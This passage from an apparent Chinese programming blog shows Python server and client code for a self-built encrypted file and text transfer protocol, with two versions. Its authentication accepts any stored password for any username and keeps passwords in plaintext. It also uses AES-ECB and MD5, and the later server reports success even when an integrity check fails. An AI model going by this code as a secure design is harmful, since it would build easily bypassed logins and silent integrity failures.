class="line">def decrypt_data(shared_key,data):   #data要为byte型</span><br><span class="line">    key = shared_key[:16]</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    decrypted_data = aes.decrypt(data)</span><br><span class="line">    data = (unpad(decrypted_data, 16)).decode() </span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">def unpack_data(sock,shared_key,orign_data):</span><br><span class="line">    sliced_sum = int.from_bytes(orign_data[:2],byteorder = &#x27;big&#x27;)</span><br><span class="line">    sliced_num = int.from_bytes(orign_data[2:4],byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_length = int.from_bytes(orign_data[4:8], byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_type = int.from_bytes(orign_data[8:12], byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_md5 = (orign_data[-32:]).decode()</span><br><span class="line">    base_data = decrypt_data(shared_key,orign_data[12:(data_length-32)])</span><br><span class="line">    data = base64.b64decode(base_data.encode())</span><br><span class="line">    value = verify_md5(data,data_md5,sock)</span><br><span class="line">    if value == 0:</span><br><span class="line">        sock.send(f&quot;第&#123;sliced_num+1&#125;组数据校验失败&quot;.encode())</span><br><span class="line">    else :</span><br><span class="line">        sock.send(f&quot;第&#123;sliced_num+1&#125;组数据校验成功&quot;.encode())</span><br><span class="line">    return sliced_sum,sliced_num,data_type,data,value</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def Authentication(sock,shared_key,cursor):</span><br><span class="line">    key = shared_key[:16]</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    username = (sock.recv(1024))</span><br><span class="line">    username = decrypt_data(shared_key,username)</span><br><span class="line">    cursor.execute(&quot;SELECT username FROM users WHERE username = ?&quot;, (username,))</span><br><span class="line">    result = cursor.fetchone()</span><br><span class="line">    if result != None:</span><br><span class="line">        sock.send(f&quot;找到用户&#123;username&#125; 接下来进行密码验证&quot;.encode())</span><br><span class="line">        print(&quot;用户名正确&quot;)</span><br><span class="line">        password = (sock.recv(1024))</span><br><span class="line">        decrypted_password = aes.decrypt(password)</span><br><span class="line">        password = (unpad(decrypted_password, 16)).decode()</span><br><span class="line">        cursor.execute(&quot;SELECT password FROM users WHERE password = ?&quot;, (password,))</span><br><span class="line">        result = cursor.fetchone()</span><br><span class="line">        if result != None:</span><br><span class="line">            sock.send(&quot;身份验证通过&quot;.encode())</span><br><span class="line">            print(&quot;密码正确&quot;)</span><br><span class="line">            if username == &quot;admin&quot;:</span><br><span class="line">                permission_value = 1</span><br><span class="line">            else :</span><br><span class="line">                permission_value = 0</span><br><span class="line">            return permission_value</span><br><span class="line">        else :</span><br><span class="line">            sock.send(&quot;密码错误，终止连接&quot;.encode())</span><br><span class="line">            sock.close()</span><br><span class="line">            return 3</span><br><span class="line">    else:</span><br><span class="line">        sock.send(&quot;你输入的用户名不存在 终止本次连接&quot;.encode())</span><br><span class="line">        sock.close()</span><br><span class="line">        return 3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def menu(sock):</span><br><span class="line">    text = &quot;开始进行数据传输 请按照规定格式发送数据&quot;</span><br><span class="line">    sock.send(text.encode())</span><br><span class="line"></span><br><span class="line">def transfer_txt(addr,data):</span><br><span class="line">    print(f&quot;客户机&#123;addr&#125;传输的数据为: &#123;data&#125;&quot;)</span><br><span class="line"></span><br><span class="line">def transfer_file(sock,data):</span><br><span class="line">    data_type = mime.from_buffer(data)</span><br><span class="line">    if data_type == &quot;text/plain&quot;:</span><br><span class="line">        with open(&quot;output.txt&quot;, &#x27;wb&#x27;) as f:</span><br><span class="line">            f.write(data.encode())</span><br><span class="line">    sock.send(&quot;成功接受到文件\n&quot;.encode())</span><br><span class="line"></span><br><span class="line">def transfer_file2(sock,data,sliced_sum,sliced_num,shared_key):</span><br><span class="line">    data_bytes = data</span><br><span class="line">    while sliced_num != sliced_sum-1:</span><br><span class="line">        orign_data = (sock.recv(2048))</span><br><span class="line">        sliced_sum,sliced_num,data_type,data,value = unpack_data(sock,shared_key,orign_data)</span><br><span class="line">        data_bytes += data</span><br><span class="line">    data_type = mime.from_buffer(data_bytes)</span><br><span class="line">    if data_type == &quot;image/png&quot;:</span><br><span class="line">        with open(&quot;output.png&quot;, &#x27;wb&#x27;) as f:</span><br><span class="line">            f.write(data_bytes)</span><br><span class="line">    sock.send(&quot;成功接受到文件\n&quot;.encode())</span><br><span class="line">    # if data_type == &quot;text/plain&quot;:</span><br><span class="line">    #     with open(&quot;output.txt&quot;, &#x27;wb&#x27;) as f:</span><br><span class="line">    #         f.write(data_bytes)</span><br><span class="line">    # sock.send(&quot;成功接受到文件&quot;.encode())</span><br><span class="line"></span><br><span class="line">def register(permission_value,sock,shared_key,cursor,data):</span><br><span class="line">    if permission_value == 0:</span><br><span class="line">        sock.send(&quot;你所登录的用户并没有拥有管理员权限 无法注册用户&quot;.encode())</span><br><span class="line">        return</span><br><span class="line">    else :  </span><br><span class="line">        parts = data.split(b&#x27;;&#x27;)</span><br><span class="line">        username = parts[0]</span><br><span class="line">        password = parts[1]</span><br><span class="line">        try:</span><br><span class="line">            # 插入新的用户数据</span><br><span class="line">            cursor.execute(&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;, (username, password))</span><br><span class="line">            conn.commit()</span><br><span class="line">            sock.send(&quot;用户注册成功&quot;.encode())</span><br><span class="line">        except sqlite3.IntegrityError:</span><br><span class="line">            sock.send(&quot;用户已存在&quot;.encode())</span><br><span class="line">        except Exception as e:</span><br><span class="line">            sock.send(e.encode())</span><br><span class="line"></span><br><span class="line">def verify_md5(data, original_md5,sock):</span><br><span class="line">    current_md5 = md5_encrypt(data)</span><br><span class="line">    return current_md5 == original_md5</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line"></span><br><span class="line">    # 创建 DH 参数对象</span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    private_key_server = parameters.generate_private_key()</span><br><span class="line">    public_key_server = private_key_server.public_key()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建套接字 默认使用TCP协议</span><br><span class="line">    s.bind((&quot;10.0.137.2&quot;,6666))</span><br><span class="line">    s.listen(5) #最多连接5个客户端</span><br><span class="line">    while 1:</span><br><span class="line">        public_key_client,sock,addr = key_switch(s,public_key_server)</span><br><span class="line">        print(&quot;公钥交换成功&quot;)</span><br><span class="line">        print(&quot;开始计算共享密钥&quot;)</span><br><span class="line">        shared_key = private_key_server.exchange(public_key_client)</span><br><span class="line">        print(&quot;等待连接中&quot;)</span><br><span class="line">        print(sock,addr)</span><br><span class="line">        print(&quot;开始进行身份验证&quot;)</span><br><span class="line">        permission_value = Authentication(sock,shared_key,cursor)</span><br><span class="line">        if permission_value == 3:</span><br><span class="line">            continue</span><br><span class="line">        while 1:</span><br><span class="line">            menu(sock)</span><br><span class="line">            orign_data = (sock.recv(2048))</span><br><span class="line">            if len(orign_data) == 0:</span><br><span class="line">                break</span><br><span class="line">            sliced_sum,sliced_num,data_type,data,value = unpack_data(sock,shared_key,orign_data)</span><br><span class="line">            if data_type == 1:</span><br><span class="line">                transfer_txt(addr,data)</span><br><span class="line">            elif data_type == 2:</span><br><span class="line">                if sliced_sum != 0 or sliced_num != 0:</span><br><span class="line">                    transfer_file2(sock,data,sliced_sum,sliced_num,shared_key)</span><br><span class="line">                else:</span><br><span class="line">                    transfer_file(sock,data)</span><br><span class="line">            elif data_type ==3:</span><br><span class="line">                register(permission_value,sock,shared_key,cursor,data)</span><br><span class="line">        sock.close()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line">import hashlib</span><br><span class="line">import base64</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">choice_text = &quot;&quot;&quot;</span><br><span class="line">1.传输文本数据</span><br><span class="line">2.传输文件数据</span><br><span class="line">3.新增用户</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">def md5_encrypt(data):</span><br><span class="line">    # 创建 MD5 哈希对象</span><br><span class="line">    md5_hash = hashlib.md5()</span><br><span class="line"></span><br><span class="line">    # 更新哈希对象</span><br><span class="line">    md5_hash.update(data)</span><br><span class="line"></span><br><span class="line">    # 获取十六进制的哈希值</span><br><span class="line">    hash_result = md5_hash.hexdigest()</span><br><span class="line">    </span><br><span class="line">    return hash_result</span><br><span class="line"></span><br><span class="line">def pack_data(choice,base_data,shared_key,sliced,sum,data):</span><br><span class="line">    sliced_sum = struct.pack(&#x27;&gt;H&#x27;,sum)</span><br><span class="line">    sliced_num = struct.pack(&#x27;&gt;H&#x27;,sliced)</span><br><span class="line">    choice_type = struct.pack(&#x27;&gt;I&#x27;,choice)</span><br><span class="line">    en_data = encrypt_data(shared_key,base_data.decode())</span><br><span class="line">    hash_data = md5_encrypt(data).encode()</span><br><span class="line">    temp = choice_type+en_data+hash_data</span><br><span class="line">    transfer_data = sliced_sum+sliced_num+struct.pack(&#x27;&gt;I&#x27;,len(temp)+8)+temp</span><br><span class="line">    return transfer_data</span><br><span class="line"></span><br><span class="line">def key_switch(s,public_key_client):</span><br><span class="line">    print(&quot;开始进行公钥交换&quot;)</span><br><span class="line">    s.connect((&quot;69.165.67.133&quot;,6666))</span><br><span class="line">    public_key_bytes = public_key_client.public_bytes(</span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    s.send(public_key_bytes)</span><br><span class="line">    public_key_server = s.recv(1024)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_server)</span><br><span class="line"></span><br><span class="line">def encrypt_data(shared_key,data):</span><br><span class="line">    key = shared_key[:16]  </span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    data_bytes = pad(data.encode(&#x27;utf-8&#x27;), AES.block_size)</span><br><span class="line">    encrypt_data = aes.encrypt(data_bytes)</span><br><span class="line">    return encrypt_data</span><br><span class="line"></span><br><span class="line">def Authentication(s,shared_key):</span><br><span class="line">    print(&quot;进行身份验证&quot;)</span><br><span class="line">    key = shared_key[:16]  </span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    username = input(&quot;输入用户名:&quot;)</span><br><span class="line">    encrypt_username = encrypt_data(shared_key,username)</span><br><span class="line">    s.send(encrypt_username)</span><br><span class="line">    text = s.recv(1024).decode()</span><br><span class="line">    if text == &quot;你输入的用户名不存在 终止本次连接&quot;:</span><br><span class="line">        print(text)</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        print(text)</span><br><span class="line">        password = input(&quot;输入密码:&quot;)</span><br><span class="line">        encrypt_password = encrypt_data(shared_key,password)</span><br><span class="line">        s.send(encrypt_password)</span><br><span class="line">        text = s.recv(1024).decode()</span><br><span class="line">        if text == &quot;密码错误，终止连接&quot;:</span><br><span class="line">            print(text)</span><br><span class="line">            exit()</span><br><span class="line">        else :</span><br><span class="line">            print(text)</span><br><span class="line">        </span><br><span class="line">def register(s,shared_key):</span><br><span class="line">    username = input(&quot;输入用户名 :&quot;)</span><br><span class="line">    password = input(&quot;输入密码 :&quot;)</span><br><span class="line">    data = username+&quot;;&quot;+password</span><br><span class="line">    base_data = base64.b64encode(data.encode())</span><br><span class="line">    transfer_data = pack_data(3,base_data,shared_key,0,0,data.encode())</span><br><span class="line">    s.send(transfer_data)</span><br><span class="line"></span><br><span class="line">def transfer_txt(s,shared_key):</span><br><span class="line">    text = input(&quot;输入数据 :&quot;)</span><br><span class="line">    if len(text) &gt; 1000:</span><br><span class="line">        sliced = 0</span><br><span class="line">        base64_text = base64.b64encode(text.encode())</span><br><span class="line">        chunk_size = 1000</span><br><span class="line">        sliced_data = slice_string(base64_text, chunk_size)</span><br><span class="line">        sliced_sum = len(sliced_data)</span><br><span class="line">        for i in range(len(sliced_data)):</span><br><span class="line">            transfer_data = pack_data(1,sliced_data[i],shared_key,sliced,sliced_sum,sliced_data[i])</span><br><span class="line">            sliced += 1</span><br><span class="line">            s.send(transfer_data)</span><br><span class="line">    else :</span><br><span class="line">        sliced = 0</span><br><span class="line">        sliced_sum = 0</span><br><span class="line">        base_text = base64.b64encode(text.encode())</span><br><span class="line">        transfer_data = pack_data(1,base_text,shared_key,sliced,sliced_sum,text.encode())</span><br><span class="line">        s.send(transfer_data)</span><br><span class="line">        print((s.recv(1024)).decode()+&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">def slice_string(data, chunk_size):</span><br><span class="line">    #根据指定大小切片字符串</span><br><span class="line">    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]</span><br><span class="line"></span><br><span class="line">def transfer_file(s,shared_key):</span><br><span class="line">    file_addr = input(&quot;请输入文件对于client.py的相对路径 :&quot;)</span><br><span class="line">    with open(file_addr,&#x27;rb&#x27;) as file:</span><br><span class="line">        text = file.read()</span><br><span class="line">    </span><br><span class="line">    if len(text) &gt; 1000:</span><br><span class="line">        sliced = 0</span><br><span class="line">        chunk_size = 1000</span><br><span class="line">        sliced_data = slice_string(text, chunk_size)</span><br><span class="line">        sliced_sum = len(sliced_data)</span><br><span class="line">        print(f&quot;一共有&#123;sliced_sum&#125;组数据需要传输\n&quot;)</span><br><span class="line">        for i in range(len(sliced_data)):</span><br><span class="line">            sliced_basedata = base64.b64encode(sliced_data[i])</span><br><span class="line">            transfer_data = pack_data(2,sliced_basedata,shared_key,sliced,sliced_sum,sliced_data[i])</span><br><span class="line">            sliced += 1</span><br><span class="line">            s.send(transfer_data)</span><br><span class="line">            print((s.recv(1024)).decode()+&quot;\n&quot;)</span><br><span class="line">    else :</span><br><span class="line">        sliced = 0</span><br><span class="line">        sliced_sum = 0</span><br><span class="line">        base_text = base64.b64encode(text)</span><br><span class="line">        transfer_data = pack_data(2,base_text,shared_key,sliced,sliced_sum,text)</span><br><span class="line">        s.send(transfer_data)</span><br><span class="line">        print((s.recv(1024)).decode()+&quot;\n&quot;)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line"></span><br><span class="line">    # 创建 DH 参数对象</span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    private_key_client = parameters.generate_private_key()</span><br><span class="line">    public_key_client = private_key_client.public_key()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    public_key_server = key_switch(s,public_key_client)</span><br><span class="line">    print(&quot;公钥交换成功&quot;)</span><br><span class="line">    print(&quot;开始计算共享密钥&quot;)</span><br><span class="line">    shared_key = private_key_client.exchange(public_key_server)</span><br><span class="line">    Authentication(s,shared_key)</span><br><span class="line">    print(&quot;成功连接&quot;)</span><br><span class="line">    while 1:</span><br><span class="line">        print((s.recv(1024)).decode())</span><br><span class="line">        choice = input(choice_text)</span><br><span class="line">        if choice == &quot;1&quot;:</span><br><span class="line">            transfer_txt(s,shared_key)</span><br><span class="line">        elif choice == &quot;2&quot;:</span><br><span class="line">            transfer_file(s,shared_key)</span><br><span class="line">        elif choice == &quot;3&quot;:</span><br><span class="line">            register(s,shared_key)</span><br><span class="line">        else :</span><br><span class="line">            print(&quot;未找到输入的选项，请重新输入&quot;)</span><br><span class="line">            continue</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h1 id="代码迭代"><a href="#代码迭代" class="headerlink" title="代码迭代"></a>代码迭代</h1><p>针对一个简单协议所需要的功能已经大体实现了 接下来的任务就是优化服务端和客户端的代码<br>主要的目标大致如下<br>1.添加图形化界面 优化交互过程<br>2.优化代码逻辑 增加注释 提高代码美观度<br>3.完善程序功能</p><h2 id="v0-5"><a href="#v0-5" class="headerlink" title="v0.5"></a>v0.5</h2><p>该版本优化了代码逻辑 完善了注释<br>客户端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line">import hashlib</span><br><span class="line">import base64</span><br><span class="line">import time</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">choice_text = &quot;&quot;&quot;</span><br><span class="line">        1.传输文本数据</span><br><span class="line">        2.传输文件数据</span><br><span class="line">        3.新增用户</span><br><span class="line">输入选项:</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">def md5_encrypt(data):  #md5加密 用于完整性检测 </span><br><span class="line">    md5_hash = hashlib.md5()</span><br><span class="line">    md5_hash.update(data)</span><br><span class="line">    hash_result = md5_hash.hexdigest()</span><br><span class="line">    return hash_result</span><br><span class="line"></span><br><span class="line">def pack_data(choice,base_data,shared_key,sliced,sum,data):  #将数据打包成报文 格式:  sliced_judge(4bytes)+data_length(4bytes)+data_type(4bytes)+encrypted_data(Dynamic)+md5_data(32bytes)</span><br><span class="line">    sliced_sum = struct.pack(&#x27;&gt;H&#x27;,sum)</span><br><span class="line">    sliced_num = struct.pack(&#x27;&gt;H&#x27;,sliced)</span><br><span class="line">    choice_type = struct.pack(&#x27;&gt;I&#x27;,choice)</span><br><span class="line">    en_data = encrypt_data(shared_key,base_data.decode())</span><br><span class="line">    hash_data = md5_encrypt(data).encode()</span><br><span class="line">    temp = choice_type+en_data+hash_data</span><br><span class="line">    transfer_data = sliced_sum+sliced_num+struct.pack(&#x27;&gt;I&#x27;,len(temp)+8)+temp </span><br><span class="line">    return transfer_data</span><br><span class="line"></span><br><span class="line">def key_switch(s,public_key_client):   #交换公钥</span><br><span class="line">    print(&quot;等待连接服务端&quot;)</span><br><span class="line">    s.connect((&quot;69.165.67.133&quot;,6666))</span><br><span class="line">    print(&quot;连接上服务端 开始进行公钥交换&quot;)</span><br><span class="line">    public_key_bytes = public_key_client.public_bytes(   </span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    s.send(public_key_bytes)</span><br><span class="line">    public_key_server = s.recv(1024)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_server)</span><br><span class="line"></span><br><span class="line">def encrypt_data(shared_key,data):  #aes加密</span><br><span class="line">    key = shared_key[:16]  </span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    data_bytes = pad(data.encode(&#x27;utf-8&#x27;), AES.block_size)</span><br><span class="line">    encrypt_data = aes.encrypt(data_bytes)</span><br><span class="line">    return encrypt_data</span><br><span class="line"></span><br><span class="line">def Authentication(s,shared_key):</span><br><span class="line">    print(&quot;开始进行身份验证&quot;)</span><br><span class="line">    username = input(&quot;输入用户名:&quot;)</span><br><span class="line">    encrypt_username = encrypt_data(shared_key,username)   #用户名经过aes加密后传输</span><br><span class="line">    s.send(encrypt_username)</span><br><span class="line">    text = s.recv(1024).decode()</span><br><span class="line">    if text == &quot;你输入的用户名不存在 终止本次连接&quot;:</span><br><span class="line">        print(text)</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        print(text)</span><br><span class="line">        password = input(&quot;输入密码:&quot;)</span><br><span class="line">        encrypt_password = encrypt_data(shared_key,password) #密码经过aes加密后传输</span><br><span class="line">        s.send(encrypt_password)</span><br><span class="line">        text = s.recv(1024).decode()</span><br><span class="line">        if text == &quot;密码错误，终止连接&quot;:</span><br><span class="line">            print(text)</span><br><span class="line">            exit()</span><br><span class="line">        else :</span><br><span class="line">            print(text)</span><br><span class="line">        </span><br><span class="line">def register(s,shared_key):</span><br><span class="line">    username = input(&quot;输入用户名 :&quot;)   #账号密码用;来间隔后 采用base64编码后丢到pack_data函数中处理</span><br><span class="line">    password = input(&quot;输入密码 :&quot;)</span><br><span class="line">    data = username+&quot;;&quot;+password</span><br><span class="line">    base_data = base64.b64encode(data.encode())</span><br><span class="line">    transfer_data = pack_data(3,base_data,shared_key,0,0,data.encode())</span><br><span class="line">    s.send(transfer_data)</span><br><span class="line"></span><br><span class="line">def transfer_txt(s,shared_key):</span><br><span class="line">    text = input(&quot;输入数据 :&quot;)   #这个函数负责处理直接传输的文本数据 但是仍然对于是否需要切片进行了判断 </span><br><span class="line">    if len(text) &gt; 1000:</span><br><span class="line">        sliced = 0</span><br><span class="line">        base64_text = base64.b64encode(text.encode())</span><br><span class="line">        chunk_size = 1000</span><br><span class="line">        sliced_data = slice_string(base64_text, chunk_size)</span><br><span class="line">        sliced_sum = len(sliced_data)</span><br><span class="line">        for i in range(len(sliced_data)):</span><br><span class="line">            transfer_data = pack_data(1,sliced_data[i],shared_key,sliced,sliced_sum,sliced_data[i])</span><br><span class="line">            sliced += 1</span><br><span class="line">            s.send(transfer_data)</span><br><span class="line">    else :</span><br><span class="line">        sliced = 0</span><br><span class="line">        sliced_sum = 0</span><br><span class="line">        base_text = base64.b64encode(text.encode())</span><br><span class="line">        transfer_data = pack_data(1,base_text,shared_key,sliced,sliced_sum,text.encode())</span><br><span class="line">        s.send(transfer_data)</span><br><span class="line">        print((s.recv(1024)).decode()+&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">def slice_string(data, chunk_size):</span><br><span class="line">    #根据指定大小切片字符串</span><br><span class="line">    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]</span><br><span class="line"></span><br><span class="line">def transfer_file(s,shared_key):</span><br><span class="line">    file_addr = input(&quot;请输入文件对于client.py的相对路径 :&quot;) #读取客户端本地文件的二进制流</span><br><span class="line">    with open(file_addr,&#x27;rb&#x27;) as file:</span><br><span class="line">        text = file.read()</span><br><span class="line">    </span><br><span class="line">    if len(text) &gt; 1000:</span><br><span class="line">        sliced = 0</span><br><span class="line">        chunk_size = 1000</span><br><span class="line">        sliced_data = slice_string(text, chunk_size)</span><br><span class="line">        sliced_sum = len(sliced_data)</span><br><span class="line">        print(f&quot;一共有&#123;sliced_sum&#125;组数据需要传输\n&quot;)</span><br><span class="line">        begin_time = time.time()</span><br><span class="line">        for i in range(len(sliced_data)):</span><br><span class="line">            sliced_basedata = base64.b64encode(sliced_data[i])</span><br><span class="line">            transfer_data = pack_data(2,sliced_basedata,shared_key,sliced,sliced_sum,sliced_data[i])</span><br><span class="line">            sliced += 1</span><br><span class="line">            s.send(transfer_data)</span><br><span class="line">            text = (s.recv(1024)).decode()</span><br><span class="line">            currect_time = time.time()</span><br><span class="line">            temp = currect_time-begin_time</span><br><span class="line">            print(&quot;\r&quot;+text+f&quot; 当前运行了&#123;temp:.0f&#125;s&quot;,end=&quot;&quot;)</span><br><span class="line">    else :</span><br><span class="line">        sliced = 0</span><br><span class="line">        sliced_sum = 0</span><br><span class="line">        base_text = base64.b64encode(text)</span><br><span class="line">        transfer_data = pack_data(2,base_text,shared_key,sliced,sliced_sum,text)</span><br><span class="line">        s.send(transfer_data)</span><br><span class="line">        print((s.recv(1024)).decode()+&quot;\n&quot;)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    </span><br><span class="line">    private_key_client = parameters.generate_private_key()</span><br><span class="line">    public_key_client = private_key_client.public_key()</span><br><span class="line">    </span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    public_key_server = key_switch(s,public_key_client)</span><br><span class="line">    print(&quot;公钥交换成功&quot;)</span><br><span class="line">    print(&quot;开始计算共享密钥&quot;)</span><br><span class="line">    shared_key = private_key_client.exchange(public_key_server)</span><br><span class="line">    Authentication(s,shared_key)</span><br><span class="line">    print(&quot;成功连接&quot;)</span><br><span class="line">    while 1:</span><br><span class="line">        print((s.recv(1024)).decode())</span><br><span class="line">        choice = input(choice_text)</span><br><span class="line">        if choice == &quot;1&quot;:</span><br><span class="line">            transfer_txt(s,shared_key)</span><br><span class="line">        elif choice == &quot;2&quot;:</span><br><span class="line">            transfer_file(s,shared_key)</span><br><span class="line">        elif choice == &quot;3&quot;:</span><br><span class="line">            register(s,shared_key)</span><br><span class="line">        else :</span><br><span class="line">            print(&quot;未找到输入的选项，请重新输入&quot;)</span><br><span class="line">            continue</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>服务端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import magic</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import sqlite3</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">mime = magic.Magic(mime=True)</span><br><span class="line">conn = sqlite3.connect(&#x27;users.db&#x27;)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line">def md5_encrypt(data):</span><br><span class="line">    md5_hash = hashlib.md5()  #md5加密</span><br><span class="line">    md5_hash.update(data)</span><br><span class="line">    hash_result = md5_hash.hexdigest()</span><br><span class="line">    </span><br><span class="line">    return hash_result</span><br><span class="line"></span><br><span class="line">def key_switch(s,public_key_server):</span><br><span class="line">    print(&quot;等待客户机连接&quot;)</span><br><span class="line">    sock,addr = s.accept()</span><br><span class="line">    print(f&quot;客户机&#123;sock&#125;&#123;addr&#125;连接成功&quot;)</span><br><span class="line">    print(&quot;开始进行公钥交换&quot;)</span><br><span class="line">    public_key_client = sock.recv(1024)</span><br><span class="line">    public_key_bytes = public_key_server.public_bytes(    #将客户端的公钥序列化为 PEM 格式的字节串</span><br><span class="line">    encoding=serialization.Encoding.PEM,  </span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    sock.send(public_key_bytes)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_client),sock,addr  #将接受到的服务端公钥反序列化为公钥对象</span><br><span class="line"></span><br><span class="line">def decrypt_data(shared_key,data):   #data要为byte型</span><br><span class="line">    key = shared_key[:16]</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    decrypted_data = aes.decrypt(data)</span><br><span class="line">    data = (unpad(decrypted_data, 16)).decode() </span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">def unpack_data(sock,shared_key,orign_data):     #拆解数据包</span><br><span class="line">    sliced_sum = int.from_bytes(orign_data[:2],byteorder = &#x27;big&#x27;)</span><br><span class="line">    sliced_num = int.from_bytes(orign_data[2:4],byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_length = int.from_bytes(orign_data[4:8], byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_type = int.from_bytes(orign_data[8:12], byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_md5 = (orign_data[-32:]).decode()</span><br><span class="line">    base_data = decrypt_data(shared_key,orign_data[12:(data_length-32)])</span><br><span class="line">    data = base64.b64decode(base_data.encode())</span><br><span class="line">    value = verify_md5(data,data_md5,sock)</span><br><span class="line">    if value == 0:</span><br><span class="line">        sock.send((f&quot;第&#123;sliced_num+1&#125;组数据校验成功&quot;).encode())</span><br><span class="line">    else :</span><br><span class="line">        sock.send((f&quot;第&#123;sliced_num+1&#125;组数据校验成功&quot;).encode())</span><br><span class="line">    return sliced_sum,sliced_num,data_type,data,value</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def Authentication(sock,shared_key,cursor):  #身份验证部分 账号密码存储在users.db数据库中</span><br><span class="line">    key = shared_key[:16]</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    username = (sock.recv(1024))</span><br><span class="line">    username = decrypt_data(shared_key,username)</span><br><span class="line">    cursor.execute(&quot;SELECT username FROM users WHERE username = ?&quot;, (username,))</span><br><span class="line">    result = cursor.fetchone()</span><br><span class="line">    if result != None:</span><br><span class="line">        sock.send(f&quot;找到用户&#123;username&#125; 接下来进行密码验证&quot;.encode())</span><br><span class="line">        print(&quot;用户名正确&quot;)</span><br><span 